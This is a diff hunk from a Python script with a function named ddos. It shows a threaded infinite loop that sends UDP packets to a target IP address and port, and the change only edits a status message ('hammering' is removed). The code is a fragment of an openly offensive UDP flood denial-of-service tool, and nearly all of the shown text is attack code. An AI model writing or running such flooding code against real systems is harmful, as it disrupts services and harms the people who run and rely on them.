@@ -31,7 +31,7 @@ def ddos(i):
     while 1:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
-        print ("\033[93m[+]",time.ctime(time.time()),"\033[95m<--packet sent! hammering-->")
+        print ("\033[93m[+]",time.ctime(time.time()),"\033[95m<--packet sent!-->")
 
 for i in range(int(thread_count)):
     try:
